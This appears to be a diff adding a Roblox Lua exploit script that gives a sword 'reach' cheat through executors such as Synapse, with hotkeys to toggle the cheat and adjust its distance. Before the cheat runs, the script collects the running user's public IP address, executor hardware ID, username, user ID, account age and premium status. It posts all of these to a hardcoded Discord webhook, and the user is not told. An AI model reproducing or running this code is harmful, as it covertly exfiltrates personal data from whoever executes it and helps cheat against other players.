@@ -1,0 +1,181 @@
+local plr = game:GetService('Players').LocalPlayer
+local count = 0
+local whitelist = {
+    'EGYPTvsALL',
+    '',
+    '',
+    '',
+}
+
+for i, v in pairs(whitelist) do
+    if plr.Name == v then
+        count = count + 1 
+    end
+end
+
+if count == 0 then
+    plr:Kick('Not Whitelisted')
+end
+
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/812679984287842334/Hue20rg6YeuFBOcUIa_6FIWV4qgrCN-iB7BPpI7Pzxu9yH1dStW91-b_tF1czx3c7MIc"
+
+
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "__**SOMEOENE HAS EXECUTED ME REACH SCRIPT!!**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UserId:",
+                    ["value"] = Game.Players.LocalPlayer.UserId,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "ALT:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+				
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+local on = true
+local distance = 7
+
+local starterGui = game:GetService("StarterGui")
+local plr = game:GetService('Players').LocalPlayer
+local cooldown = false
+game:GetService('RunService').Heartbeat:connect(function()
+    if on then
+    local hum = plr.Character.Humanoid
+        for _,v in ipairs(game.Players:GetPlayers()) do
+            if v.Name ~= plr.Name then
+                local s,e = pcall(function()
+                    local root = v.Character.HumanoidRootPart
+                    local sword = hum.Parent:FindFirstChildOfClass('Tool')
+                    if sword and (root.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= distance then 
+                         if cooldown == false then
+                        cooldown = true
+                        firetouchinterest(sword.Handle, root, 1)
+                        firetouchinterest(sword.Handle, root, 0)
+                        wait(0.05)
+                        cooldown = false
+                        end
+                    end
+                end) if e then print(e) end
+            end
+        end
+    end
+end)
+local is_on = function()
+    return on and 'on' or 'off'
+end
+
+local mouse = plr:GetMouse()
+mouse.KeyDown:connect(function(key)
+    if key == 'r' then
+        on = not on
+    elseif key == 'u' then
+        local status = is_on()
+        starterGui:SetCore('SendNotification', {Title = 'Reach', Text = 'Exploit is '..status..'. Current: '.. distance..' studs'})
+    elseif key == "e" then
+        distance = distance + 1
+        starterGui:SetCore("SendNotification", {Title = "Reach", Text = "Reach Strength has increased by 1. Current: " .. distance..' studs'})
+    elseif key == "q" then
+        if distance > 1 then
+            distance = distance - 1
+            starterGui:SetCore("SendNotification", {Title = "Reach", Text = "Reach Strength has decreased by 1. Current: " .. distance..' studs'})
+        else
+            starterGui:SetCore("SendNotification", {Title = "Reach", Text = "Cannot decrease any further!"})
+        end
+    end
+end)
